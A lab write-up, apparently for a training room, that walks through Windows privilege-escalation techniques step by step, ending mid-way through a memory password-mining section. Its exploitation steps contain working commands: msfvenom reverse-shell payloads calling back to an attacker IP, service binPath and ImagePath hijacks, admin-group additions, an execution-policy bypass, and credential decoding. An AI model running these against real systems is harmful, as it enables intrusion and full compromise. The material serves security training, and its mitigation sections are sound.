# Windows_PrivEsc_Arena

This room contains a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more.

# 1-Registry Escalation - Autorun

## 1.Explanation

**Autorun entries**: Windows uses registry keys and startup folders to automatically launch programs at logon. These entries are often used by legitimate software (antivirus, drivers, utilities).

Common registry paths include:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (per‑user)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (system‑wide)

**Privilege escalation vector**: If one of these autorun programs is stored in a directory with weak permissions, a low‑privileged attacker can replace the executable. When a privileged user logs in, the malicious program runs with their rights.

**Key concept**: This is not exploiting a vulnerability in Windows itself, but a **misconfiguration** — insecure file permissions combined with autorun execution.

## 2.Detection

**1- Run Autoruns**: 

```powershell
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

This tool enumerates all programs configured to run automatically at startup/logon.

In the **Logon tab**, you see **My Program** pointing to:

```powershell
C:\Program Files\Autorun Program\program.exe
```

![1_1.png](Images/1_1.png)

**2-** **Check permissions with Accesschk**:

```powershell
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

**Everyone: FILE_ALL_ACCESS** on `program.exe`. which means Any user can read, write, delete, or replace this file.

![1_2.png](Images/1_2.png)

## 3.Exploitation

**On Attacker Machine**

**1- Start Metasploit handler**:

```powershell
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <Kali IP>
run
```

![1_3.png](Images/1_3.png)

2- **Generate malicious payload**:

```powershell
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali IP] -f exe -o program.exe
```

![1_4.png](Images/1_4.png)

On Victim Machine

**1- Replace the vulnerable file**: Copy the malicious program.exe into C:\Program Files\Autorun Program\ , overwriting the original.

![1_5.png](Images/1_5.png)

**2- Trigger execution**: Log off and log back in as an **administrator**.

- At logon, Windows automatically runs the autorun entry.
- Since the file was replaced, the attacker’s payload executes with admin privileges.

![1_6.png](Images/1_6.png)

## 4.Deep Dive: Why This Works

- **Windows startup mechanism**:
    - Registry keys like `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` define autorun programs.
    - At logon, Windows executes each entry with the privileges of the logged‑in user.
- **Misconfiguration exploited**:
    - The autorun entry points to a file in `Program Files`.
    - Normally, `Program Files` is protected by NTFS permissions.
    - Here, **Everyone** has `FILE_ALL_ACCESS`, breaking the security model.
- **Privilege escalation path**:
    - Low‑privileged attacker replaces the file.
    - Admin logs in → autorun executes → attacker’s code runs as admin.

## 5.Mitigations

- **Permission hardening**:
    - Ensure `Program Files` and other system directories are writable only by administrators.
- **Audit autoruns**:
    - Use Sysinternals Autoruns regularly to detect suspicious entries.
- **Application whitelisting**:
    - Tools like AppLocker or Windows Defender Application Control can block unauthorized executables.
- **Monitoring & alerts**:
    - Detect changes to autorun registry keys or startup folders.
    - Monitor for unexpected file modifications in sensitive directories.
- **Least privilege principle**:
    - Users should not have unnecessary write access to system paths.

## 6.Key Takeaways

- **Registry autorun hijack** is a privilege escalation technique based on insecure file permissions.
- **Detection tools**: Autoruns (to list startup programs) + Accesschk (to verify permissions).
- **Exploitation**: Replace vulnerable autorun executable with malicious payload.
- **Impact**: Gain administrator privileges when a privileged user logs in.
- **Defense**: Harden permissions, audit autoruns, and monitor system changes.

# 2-Registry Escalation - AlwaysInstallElevated

## 1.Explanation

- **Windows Installer (.msi files)**:
MSI files are installation packages handled by the Windows Installer service (`msiexec.exe`). Normally, installing software requires administrator privileges.
- **AlwaysInstallElevated policy**:
This registry setting allows **any user** to run MSI installers with **elevated (SYSTEM/Administrator) privileges**.
    - Registry keys involved:
        - `HKLM\Software\Policies\Microsoft\Windows\Installer`
        - `HKCU\Software\Policies\Microsoft\Windows\Installer`
    - If both contain `AlwaysInstallElevated = 1`, then **any MSI file executed by any user runs with elevated rights**.
- **Why this is dangerous**:
Attackers can craft a malicious MSI package that executes arbitrary code. Since MSI runs with elevated privileges, the attacker’s code executes as SYSTEM/Administrator.

## 2.Detection

**1- Check system‑wide policy**:

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

Output shows `AlwaysInstallElevated = 1`

![2_1.png](Images/2_1.png)

**2- Check user‑specific policy**:

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

Output also shows `AlwaysInstallElevated = 1`

![2_2.png](Images/2_2.png)

## 3.Exploitation

**On Kali**

**1- Start Metasploit handler**:

```powershell
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali IP]
run
```

Prepares to catch incoming reverse shells.

![2_3.png](Images/2_3.png)

**2- Generate malicious MSI payload**:

```powershell
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali IP] -f msi -o setup.msi
```

Creates a malicious installer (`setup.msi`) that spawns a reverse shell when executed.

![2_4.png](Images/2_4.png)

**On Windows**

**1- Copy payload**: Place `setup.msi` in `C:\Temp`.

![2_5.png](Images/2_5.png)

**2- Execute installer**:

```powershell
msiexec /quiet /qn /i C:\Temp\setup.msi
```

- `/quiet /qn`: Runs silently with no user prompts.
- `/i`: Installs the MSI package.
- Because of AlwaysInstallElevated, this runs with **SYSTEM/Administrator privileges**.

![2_6.png](Images/2_6.png)

![2_7.png](Images/2_7.png)

## 4.Deep Dive: Why This Works

- **Normal behavior**: MSI files require elevated privileges to install system‑wide software.
- **Misconfiguration**: AlwaysInstallElevated = 1 in both HKLM and HKCU means *any user* can run MSI installers with elevated rights.
- **Attack path**:
    - Attacker crafts malicious MSI.
    - Executes it with `msiexec`.
    - Installer runs as SYSTEM → attacker gains full control.

## 5.Mitigations

- **Disable AlwaysInstallElevated**:
    - Ensure both registry keys are set to `0` or not present.
    - Group Policy: `Computer Configuration → Administrative Templates → Windows Components → Windows Installer → Always install with elevated privileges` should be disabled.
- **Restrict MSI execution**:
    - Use AppLocker or Windows Defender Application Control to block unauthorized MSI files.
- **Audit registry settings**:
    - Regularly check for insecure policies in `HKLM` and `HKCU`.
- **Least privilege principle**:
    - Prevent users from modifying installer policies.
    - Ensure only administrators can install system‑wide software.

## 6.Key Takeaways

- **AlwaysInstallElevated** is a dangerous misconfiguration that allows privilege escalation via MSI installers.
- **Detection**: Check registry keys in both HKLM and HKCU.
- **Exploitation**: Generate malicious MSI with msfvenom, run via `msiexec`.
- **Impact**: Gain SYSTEM/Administrator privileges from a low‑privileged account.
- **Defense**: Disable the policy, restrict MSI execution, and audit registry settings.

# 3-Service Escalation - Registry

## 1.Explanation

- **Windows Services**:
Services are long‑running processes managed by the Service Control Manager (SCM). They often run with **SYSTEM privileges** and start automatically at boot or on demand.
- **Service registry keys**:
Each service has a registry entry under:
`HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`
    - The `ImagePath` value specifies the executable that the service runs.
    - Permissions on this registry key determine who can modify the service configuration.
- **Privilege escalation vector**:
If a low‑privileged user has **FullControl** over a service’s registry key, they can change the `ImagePath` to point to a malicious executable. When the service starts, the malicious binary runs with SYSTEM privileges.

## 2.Detection

**1- Check ACLs on the service registry key**: **Power Shell**

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

Output shows that **NT AUTHORITY\INTERACTIVE** (any logged‑in user) has **FullControl**.

![3_1.png](Images/3_1.png)

**Interpretation**: Any interactive user can modify the registry configuration of the `regsvc` service. This is a serious misconfiguration.

## 3.Exploitation

**On Kali**

**1- Prepare malicious service binary**:

Copy `windows_service.c` from the victim to Kali for editing.

**2- Modify source code**: 

Replace the command in the `system()` function with:

```powershell
cmd.exe /k net localgroup administrators user /add
```

![3_2.png](Images/3_2.png)

This command adds the current user to the **local administrators group**.

**3- Compile the binary**:

```powershell
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

- Cross‑compiles the C source into a Windows executable.
- If the compiler isn’t installed: `sudo apt install gcc-mingw-w64`.

**Transfer payload**: Copy `x.exe` back to the Windows under the Temp.

![3_3.png](Images/3_3.png)

**On Windows**

**1- Hijack service registry configuration**:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```

This overwrites the service’s `ImagePath` to point to the malicious binary.

![3_4.png](Images/3_4.png)

**2- Start the service:**

```powershell
sc start regsvc
```

- SCM launches the service.
- Since services run with SYSTEM privileges, `x.exe` executes as SYSTEM.

**3- Verify escalation**:

```powershell
net localgroup administrators
```

![done3.png](Images/done3.png)

## 4.Deep Dive: Why This Works

- **Normal behavior**: Services are controlled by SCM and typically require admin rights to configure.
- **Misconfiguration**: Here, the registry ACL allows **interactive users** to modify the service configuration.
- **Attack path**:
    - Attacker changes `ImagePath` to point to malicious binary.
    - Starts the service.
    - SCM runs the binary with SYSTEM privileges.
    - Malicious binary executes attacker’s command → user added to administrators group.

## 5.Mitigations

- **Restrict registry permissions**:
    - Service registry keys should only be modifiable by administrators.
    - Audit ACLs with `Get-Acl` or security tools.
- **Service hardening**:
    - Ensure services run with least privilege.
    - Avoid giving unnecessary write access to service configurations.
- **Monitoring**:
    - Detect changes to service registry keys (`HKLM\SYSTEM\CurrentControlSet\Services`).
    - Alert on suspicious modifications to `ImagePath`.
- **Principle of least privilege**:
    - Prevent users from having FullControl over sensitive registry paths.
    - Regularly audit permissions with tools like Accesschk.

## 6.Key Takeaways

- **Service registry misconfigurations** can be exploited for privilege escalation.
- **Detection**: Use PowerShell `Get-Acl` to check registry permissions.
- **Exploitation**: Replace service `ImagePath` with malicious binary, start service, gain SYSTEM privileges.
- **Impact**: Attacker can add themselves to administrators group or execute arbitrary SYSTEM commands.
- **Defense**: Harden registry permissions, monitor service configurations, enforce least privilege.

# 4-Service Escalation - Executable Files

## 1.Explanation

- **Windows Services**:
Services are managed by the Service Control Manager (SCM). They often run with **SYSTEM privileges** and can start automatically or on demand.
- **Service binaries**:
Each service points to an executable file (e.g., `filepermservice.exe`) that SCM runs when the service starts.
    - Normally, only administrators should be able to modify these binaries.
    - If low‑privileged users can overwrite the service executable, they can replace it with malicious code.
- **Privilege escalation vector**:
Replace the service binary with a malicious payload. When the service starts, SCM executes the payload with SYSTEM privileges, giving the attacker full control.

## 2.Detection

**1- Check permissions with Accesschk**:

```powershell
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

Output shows **Everyone** has `FILE_ALL_ACCESS` on `filepermservice.exe`.

![4_1.png](Images/4_1.png)

**Interpretation**: Any user can read, write, delete, or replace the service binary. This is a critical misconfiguration.

## 3.Exploitation

**On Kali**

**1- Start Metasploit handler**:

```powershell
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=192.168.160.149
set LPORT=4444
run
```

Prepares to catch incoming reverse shells.

![4_2.png](Images/4_2.png)

**2- Generate malicious payload**:

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.160.149 LPORT=4444 -f exe -o exp.exe
```

Creates a trojanized executable (`exp.exe`) that connects back to the attacker.

![4_3.png](Images/4_3.png)

**3- Transfer payload**: Copy `exp.exe` to the Windows under Temp.

![4_4.png](Images/4_4.png)

**4- Replace the vulnerable service binary**:

```powershell
copy /y c:\Temp\exp.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```

- `/y` forces overwrite without prompt.
- This replaces the legitimate service binary with the malicious payload.

**5- Start the service**:

```powershell
sc start filepermsvc
```

- SCM launches the service.
- Since services run with SYSTEM privileges, the malicious payload executes as SYSTEM.

![4_5.png](Images/4_5.png)

![4_6.png](Images/4_6.png)

## 4.Deep Dive: Why This Works

- **Normal behavior**: Service binaries are protected by NTFS permissions.
- **Misconfiguration**: Here, **Everyone** has `FILE_ALL_ACCESS` on the service executable.
- **Attack path**:
    - Attacker replaces the binary with malicious payload.
    - Starts the service.
    - SCM executes the payload with SYSTEM privileges.
    - Attacker gains full control.

## 5.Mitigations

- **Restrict file permissions**:
    - Service binaries should only be writable by administrators.
    - Audit NTFS permissions with tools like Accesschk.
- **Service hardening**:
    - Ensure services run with least privilege.
    - Avoid giving unnecessary write access to service executables.
- **Monitoring**:
    - Detect changes to service binaries.
    - Alert on unexpected modifications in `Program Files`.
- **Principle of least privilege**:
    - Prevent users from having FullControl over sensitive executables.
    - Regularly audit permission

## 6.Key Takeaways

- **Executable file replacement** is a straightforward privilege escalation technique.
- **Detection**: Use Accesschk to identify weak permissions on service binaries.
- **Exploitation**: Replace vulnerable binary with malicious payload, start service, gain SYSTEM privileges.
- **Impact**: Full system compromise.
- **Defense**: Harden file permissions, monitor service binaries, enforce least privilege.

# 5-Startup Applications

## 1.Explanantion

- **Startup folder**:
Windows has a special directory (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`) where any executable placed will automatically run when a user logs in.
    - This is intended for legitimate applications (e.g., antivirus, productivity tools).
    - If attackers can write here, they can ensure their payload executes every time a privileged user logs in.
- **Privilege escalation vector**:
If the **BUILTIN\Users** group has **Full Control (F)** over the Startup folder, any user can drop a malicious executable. When an administrator logs in, the payload runs with their privilege

## 2.Detection

**1- Check permissions with icacls**:

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Output shows: `BUILTIN\Users:(F)`
- Meaning: All standard users have **Full Control** over the Startup folder.

![5_1.png](Images/5_1.png)

## 3.Exploitation

**1- Start Metasploit handler**:

```powershell
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=[Kali IP]
run
```

![5_2.png](Images/5_2.png)

**2- Generate malicious payload**:

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali IP] -f exe -o x.exe
```

Creates a trojanized executable (`x.exe`) that connects back to the attacker.

![5_3.png](Images/5_3.png)

**3- Transfer payload**: Copy `x.exe` to the Windows under Temp dir

![5_4.png](Images/5_4.png)

**4- Place payload in Startup folder**:

```powershell
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

This ensures the payload runs automatically at the next login.

![5_5.png](Images/5_5.png)

**5- Trigger execution**:

- Log off.
- Log back in with **administrator credentials**.
- At login, Windows automatically executes all files in the Startup folder, including the malicious payload.

![5_6.png](Images/5_6.png)

## 4.Deep Dive: Why This Works

- **Normal behavior**: Startup folder is used to launch applications at login.
- **Misconfiguration**: Here, **BUILTIN\Users** have Full Control over the Startup folder.
- **Attack path**:
    - Attacker drops malicious executable in Startup folder.
    - Admin logs in → Windows executes payload.
    - Payload runs with admin privileges → attacker gains full control.

## 5.Mitigations

- **Restrict permissions**:
    - Startup folder should only be writable by administrators.
    - Audit NTFS permissions with `icacls` or Accesschk.
- **Application whitelisting**:
    - Use AppLocker or Windows Defender Application Control to block unauthorized executables.
- **Monitoring**:
    - Detect changes to Startup folder contents.
    - Alert on unexpected executables placed in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`.
- **Least privilege principle**:
    - Prevent standard users from modifying system‑wide startup locations.
    - Regularly audit permissions.

## 6.Key Takeaways

- **Startup folder hijack** is a privilege escalation technique based on insecure directory permissions.
- **Detection**: Use `icacls` to check permissions on Startup folder.
- **Exploitation**: Drop malicious payload in Startup folder, log in as admin, gain elevated privileges.
- **Impact**: Full compromise of administrator account.
- **Defense**: Harden permissions, monitor Startup folder, enforce least privilege.

# 6-Service Escalation - DLL Hijacking

## 1.Explanation

- **Dynamic Link Libraries (DLLs)**:
DLLs are shared code libraries that executables load at runtime. Services often rely on DLLs for functionality.
- **DLL search order**:
When a program requests a DLL, Windows searches specific directories in order (application directory, system directories, PATH locations). If the DLL is missing, Windows may attempt to load it from writable locations if referenced.
- **Privilege escalation vector**:
If a service running with **SYSTEM privileges** attempts to load a DLL from a writable directory and fails (NAME NOT FOUND), an attacker can place a malicious DLL there. When the service starts, it loads the attacker’s DLL and executes code as SYSTEM.

## 2.Detection

**1-Run Process Monitor (Procmon)**:

- Launch `Procmon.exe` as administrator.
- Set filters:
    - `Process Name is dllhijackservice.exe then Include`
    - `Result is NAME NOT FOUND then Include`

**Note:** In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it

![6_2.png](Images/6_2.png)

2-**Start the service**:

```powershell
sc start dllsvc
```

3-**Observe results in Procmon**:

- You see entries where the service tries to load `C:\Temp\hijackme.dll`.
- Result: **NAME NOT FOUND** → DLL not present.
- Critical detail: `C:\Temp` is writable by normal users.

![6_4.png](Images/6_4.png)

**Interpretation**: The service is vulnerable to DLL hijacking because it attempts to load a missing DLL from a writable location.

## 3.Exploitation

**1- Prepare malicious DLL source**: Copy `windows_dll.c` from victim to Kali.

**2- Modify source code**: Replace the system()

```
cmd.exe /k net localgroup administrators user /add
```

![6_5.png](Images/6_5.png)

**3- Compile malicious DLL**:

```powershell
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

- `shared` ensures the output is a DLL.
- Produces `hijackme.dll`.

**4- Transfer payload**: Copy `hijackme.dll` to the Windows in `C:\Temp\`

**5- Restart the vulnerable service**:

```powershell
sc stop dllsvc & sc start dllsvc
```

Service restarts and loads `hijackme.dll` from `C:\Temp`.

![6_6.png](Images/6_6.png)

**6- Verify escalation**:

```powershell
net localgroup administrators
```

Confirms the user has been added to the administrators group.

![6_7.png](Images/6_7.png)

## 4.Deep Dive: Why This Works

- **Normal behavior**: Services load required DLLs from system paths.
- **Misconfiguration**: Service attempts to load a DLL (`hijackme.dll`) from `C:\Temp`, which is writable.
- **Attack path**:
    - Attacker places malicious DLL in `C:\Temp`.
    - Service restarts → loads attacker’s DLL.
    - DLL executes attacker’s command with SYSTEM privileges.
    - User gains administrator rights.

## 5.Mitigations

- **Restrict writable directories**:
    - Services should never load DLLs from user‑writable paths.
    - Ensure directories like `C:\Temp` are not used in DLL search paths.
- **Audit DLL loading**:
    - Use Procmon to identify services attempting to load missing DLLs.
    - Investigate “NAME NOT FOUND” results.
- **Code signing & whitelisting**:
    - Require DLLs to be signed.
    - Use AppLocker or Windows Defender Application Control to block unauthorized DLLs.
- **Service hardening**:
    - Configure services to explicitly load DLLs from secure directories.
    - Avoid relative paths or insecure search orders.

## 6.Key Takeaways

- **DLL hijacking** is a powerful privilege escalation technique when services load DLLs from insecure paths.
- **Detection**: Use Procmon filters to identify missing DLLs (`NAME NOT FOUND`).
- **Exploitation**: Place malicious DLL in writable directory, restart service, gain SYSTEM privileges.
- **Impact**: Full compromise of administrator account.
- **Defense**: Harden DLL search paths, restrict writable directories, monitor service behavior.

# 7-Service Escalation - binPath

## 1.Explanation

- **Windows Services**:
Services are managed by the Service Control Manager (SCM). They often run with **SYSTEM privileges** and can be configured to start automatically or manually.
- **binPath parameter**:
Each service has a `binPath` property that specifies the executable to run when the service starts.
    - Example: `binPath= "C:\Program Files\MyService\service.exe"`
    - If a user can change this path, they can redirect the service to run arbitrary commands.
- **Privilege escalation vector**:
If a low‑privileged user has the **SERVICE_CHANGE_CONFIG** permission, they can reconfigure the service to run a malicious command. When the service starts, SCM executes the attacker’s command with SYSTEM privileges.

## 2.Detection

**1- Check service permissions with Accesschk**:

```powershell
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

Output shows: `User-PC\User` has **SERVICE_CHANGE_CONFIG** permission.

![7_1.png](Images/7_1.png)

**Interpretation**: The current user can change the configuration of the `daclsvc` service. This is a serious misconfiguration.

## 3.Exploitation

**1- Reconfigure the service binPath**:

```powershell
sc config daclsvc binpath= "net localgroup administrators user /add"
```

- This changes the service’s executable path to run the command:
`net localgroup administrators user /add`
- Meaning: When the service starts, it will add the current user to the administrators group.

![7_2.png](Images/7_2.png)

**2- Start the service**:

```powershell
sc start daclsvc
```

- SCM launches the service.
- Since services run with SYSTEM privileges, the command executes as SYSTEM.

**3- Verify escalation**:

```powershell
net localgroup administrators
```

Confirms that the user has been added to the administrators group.

![7_3.png](Images/7_3.png)

## 4.Deep Dive: Why This Works

- **Normal behavior**: Only administrators should be able to change service configurations.
- **Misconfiguration**: Here, the user has **SERVICE_CHANGE_CONFIG** permission.
- **Attack path**:
    - Attacker changes `binPath` to run arbitrary command.
    - Starts the service.
    - SCM executes the command with SYSTEM privileges.
    - User gains administrator rights.

## 5.Mitigations

- **Restrict service permissions**:
    - Only administrators should have `SERVICE_CHANGE_CONFIG`.
    - Audit service permissions with Accesschk.
- **Service hardening**:
    - Configure services to run with least privilege.
    - Avoid granting unnecessary permissions to non‑admin users.
- **Monitoring**:
    - Detect changes to service configurations (`binPath`).
    - Alert on suspicious modifications.
- **Principle of least privilege**:
    - Prevent standard users from modifying service configurations.
    - Regularly audit permissions.

## 6.Key Takeaways

- **binPath manipulation** is a powerful privilege escalation technique.
- **Detection**: Use Accesschk to identify users with `SERVICE_CHANGE_CONFIG`.
- **Exploitation**: Change `binPath` to run malicious command, start service, gain SYSTEM privileges.
- **Impact**: Full compromise of administrator account.
- **Defense**: Harden service permissions, monitor configuration changes, enforce least privilege.

# 8-Service Escalation - Unquoted Service Paths

## 1.Explanation

- **Windows Services**:
Services are managed by the Service Control Manager (SCM). They often run with **SYSTEM privileges** and can start automatically or manually.
- **Unquoted service paths**:
When a service’s `BINARY_PATH_NAME` contains spaces but is not enclosed in quotes, Windows interprets the path ambiguously.
    - Example:
    
    ```powershell
    C:\Program Files\Unquoted Path Service\Common Files\Service.exe
    ```
    
    - Without quotes, Windows may attempt to execute:
    - `C:\Program.exe`
    - `C:\Program Files\Unquoted.exe`
    - `C:\Program Files\Unquoted Path Service\Common.exe`
    - …until it finds a valid executable
- **Privilege escalation vector**:
If attackers can write to one of these directories, they can drop a malicious executable with a matching name (e.g., `common.exe`). When the service starts, SCM executes the attacker’s binary with SYSTEM privileges.

## 2.Detection

**1-Check service configuration**:

```powershell
sc qc unquotedsvc
```

- Output shows `BINARY_PATH_NAME` is unquoted and contains spaces.
- Example: `C:\Program Files\Unquoted Path Service\Common Files\Service.exe`

![8_1.png](Images/8_1.png)

**Interpretation**: This service is vulnerable to unquoted path exploitation because Windows will search for executables in each directory level.

## 3.Exploitation

**1- Generate malicious payload**:

```powershell
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

Creates a malicious executable (`common.exe`) that adds the current user to the administrators group.

![8_2.png](Images/8_2.png)

**2- Transfer payload**: Copy `common.exe` to the Windows `c:\Temp\common.exe`

**3- Place payload in the vulnerable directory**:

```powershell
copy c:\Temp\common.exe "C:\Program Files\Unquoted Path Service\"
```

This ensures Windows will find `common.exe` when resolving the unquoted path.

![8_3.png](Images/8_3.png)

**4- Start the vulnerable service**:

```powershell
sc start unquotedsvc
```

- SCM launches the service.
- Because of the unquoted path, it executes `common.exe` instead of the intended binary.

![8_4.png](Images/8_4.png)

**5- Verify escalation**:

```powershell
net localgroup administrators
```

Confirms the user has been added to the administrators group.

![8_5.png](Images/8_5.png)

## 4.Deep Dive: Why This Works

- **Normal behavior**: Windows should execute the intended service binary.
- **Misconfiguration**: Unquoted paths with spaces cause Windows to misinterpret the executable location.
- **Attack path**:
    - Attacker drops malicious executable (`common.exe`) in writable directory.
    - SCM starts service → executes attacker’s binary.
    - Binary runs with SYSTEM privileges → attacker gains administrator rights.

## 5.Mitigations

- **Quote service paths**:
    - Always enclose `BINARY_PATH_NAME` in quotes if it contains spaces.
    - Example: `"C:\Program Files\Unquoted Path Service\Common Files\Service.exe"`
- **Restrict directory permissions**:
    - Ensure directories like `C:\Program Files` are writable only by administrators.
    - Audit NTFS permissions with Accesschk.
- **Audit services**:
    - Use tools like `sc qc`, PowerShell scripts, or vulnerability scanners to detect unquoted paths.
- **Monitoring**:
    - Detect unexpected executables in service directories.
    - Alert on suspicious file creations in `Program Files`.

## 6.Key Takeaways

- **Unquoted service paths** are a common misconfiguration leading to privilege escalation.
- **Detection**: Use `sc qc` to check for unquoted paths with spaces.
- **Exploitation**: Place malicious executable in vulnerable directory, start service, gain SYSTEM privileges.
- **Impact**: Full compromise of administrator account.
- **Defense**: Quote service paths, restrict permissions, audit services regularly.

# 9.Potato Escalation - Hot Potato

## 1.Explanation

- **Potato family exploits**:
These are a series of privilege escalation techniques (Hot Potato, Rotten Potato, Juicy Potato, PrintSpoofer, etc.) that abuse Windows **NTLM authentication relays** and **local privilege escalation flaws**.
- **Hot Potato (Tater.ps1)**:
    - Exploits how Windows handles **NTLM authentication** between local services.
    - It tricks the system into authenticating as **SYSTEM** to a local service controlled by the attacker.
    - The attacker then relays this authentication to execute arbitrary commands with SYSTEM privileges.
- **Why this is dangerous**:
Even if a user only has low privileges, they can leverage these flaws to escalate to SYSTEM without needing misconfigured services or weak file permissions.

## 2.Exploitation

**1- Start PowerShell with bypassed execution policy**:

```powershell
powershell.exe -nop -ep bypass
```

- `nop`: No profile.
- `ep bypass`: Bypasses script execution restrictions, allowing unsigned scripts to run.

**2- Import the Tater module**:

```powershell
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
```

Loads the Hot Potato exploit script into the PowerShell session.

![9_1.png](Images/9_1.png)

**3- Execute the exploit**:

```powershell
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

- `Trigger 1`: Specifies the exploit trigger method (forcing NTLM authentication relay).
- `Command`: The payload to execute once SYSTEM privileges are obtained.
- Here, the command adds the current user to the **local administrators group**.

![9_2.png](Images/9_2.png)

**4- Verify escalation**:

```powershell
net localgroup administrators
```

Confirms that the user has been added to the administrators group.

![9_3.png](Images/9_3.png)

## 3.Deep Dive: Why This Works

- **NTLM relay abuse**:
Hot Potato tricks Windows into authenticating as SYSTEM to a local service.
- **Privilege escalation path**:
    - Attacker sets up a fake service to capture SYSTEM’s NTLM authentication.
    - Relays this authentication to execute arbitrary commands.
    - Payload runs as SYSTEM, granting full privileges.
- **Key insight**: This exploit doesn’t rely on misconfigured services or file permissions — it abuses Windows authentication mechanisms directly.

## 4.Defensive Mitigations

- **Patch systems**:
    - Microsoft has released patches for Hot Potato and related exploits.
    - Ensure systems are fully updated to prevent NTLM relay abuse.
- **Disable NTLM where possible**:
    - Use Kerberos authentication instead of NTLM.
    - Restrict NTLM usage via Group Policy.
- **Network hardening**:
    - Prevent local relays by enforcing SMB signing and restricting local service communications.
- **Monitoring**:
    - Detect suspicious PowerShell activity (`nop -ep bypass`).
    - Monitor for unauthorized use of tools like Tater, Juicy Potato, or PrintSpoofer.

## 5.Key Takeaways

- **Hot Potato** is a privilege escalation exploit that abuses NTLM relay and local authentication flaws.
- **Exploitation**: Use Tater.ps1 to relay SYSTEM authentication and run arbitrary commands.
- **Impact**: Gain SYSTEM privileges from a low‑privileged account.
- **Defense**: Patch systems, disable NTLM, enforce Kerberos, and monitor PowerShell activity.

# 10-Password Mining Escalation - Configuration Files

## 1.Explanation

- **Unattend.xml file**:
    - Located in `C:\Windows\Panther\Unattend.xml`.
    - Used during Windows installation and unattended setup to automate configuration (e.g., user accounts, passwords, product keys).
    - Sometimes administrators mistakenly leave **cleartext or encoded passwords** inside this file.
- **Base64 encoding**:
    - Base64 is not encryption — it’s just a way to represent binary data as text.
    - If a password is stored in Base64, anyone can decode it back to cleartext easily.
- **Privilege escalation vector**:
    - If a low‑privileged user can read `Unattend.xml`, they can extract administrator credentials.
    - Decoding the Base64 string reveals the cleartext password, which can then be used to log in as an administrator.

## 2.Exploitation

**1- Open the configuration file**:

```powershell
notepad C:\Windows\Panther\Unattend.xml
```

- Scroll through the file.
- Locate the `<Password>` property.
- Inside `<Value>` tags, you’ll find a **Base64‑encoded string**.
- **Copy the Base64 string**

![10_1.png](Images/10_1.png)

**2- Decode the Base64 string**:

```powershell
echo [copied base64] | base64 -d
```

- Replace `[copied base64]` with the string from the file.
- Output reveals the **cleartext password**.

![10_2.png](Images/10_2.png)

## 3.Deep Dive: Why This Works

- **Normal behavior**: Unattend.xml is meant for automated installations.
- **Misconfiguration**: Storing sensitive credentials in plain Base64 inside the file.
- **Attack path**:
    - Attacker reads Unattend.xml..
    - Extracts Base64 string.
    - Decodes to cleartext password.
    - Uses password to log in as administrator.

**Key insight**: Base64 is not encryption — it’s trivial to decode. Storing passwords this way is equivalent to leaving them in plain text.

## 4.Defensive Mitigations

- **Avoid storing passwords in configuration files**:
    - Use secure credential management solutions (e.g., Windows Credential Manager, Group Policy).
- **Encrypt sensitive data**:
    - If credentials must be stored, use proper encryption (not Base64).
- **Restrict file permissions**:
    - Ensure files like `Unattend.xml` are accessible only to administrators.
- **Audit system files**:
    - Regularly check for sensitive information in configuration files.
- **Monitoring**:
    - Detect unauthorized access to `C:\Windows\Panther\Unattend.xml`.

## 5.Key Takeaways

- **Password mining from configuration files** is a simple but powerful privilege escalation technique.
- **Detection**: Look for sensitive files like `Unattend.xml` that may contain credentials.
- **Exploitation**: Extract Base64 strings, decode them, and use the cleartext password.
- **Impact**: Gain administrator access directly.
- **Defense**: Avoid storing passwords in files, encrypt sensitive data, restrict access, and audit regularly.

# 11-Password Mining Escalation - Memory

## Explanation

- **Process memory dumps**:
Every running process stores data in memory — including temporary credentials, session tokens, and cached authentication headers.
    - Tools like Task Manager allow you to create a **dump file** of a process.
    - Dump files contain raw memory, which can be searched for sensitive strings.
- **HTTP Basic Authentication**:
    - When a browser connects to a server requiring Basic Auth, it sends credentials encoded in **Base64**.
    - Example header:
    
    ```powershell
    Authorization: Basic dXNlcjpwYXNzd29yZA==
    ```
    
    - Decoding reveals `user:password`.
- **Privilege escalation vector**:
If an attacker can capture memory from a process (like Internet Explorer), they can extract authentication headers and decode them to recover cleartext credentia

## 2.Exploitation

**1- Start Metasploit HTTP Basic capture server**:

```powershell
msfconsole
use auxiliary/server/capture/http_basic
set uripath x
run
```

This sets up a fake HTTP server that requests Basic Authentication.

uripath x means the server listens at /x.

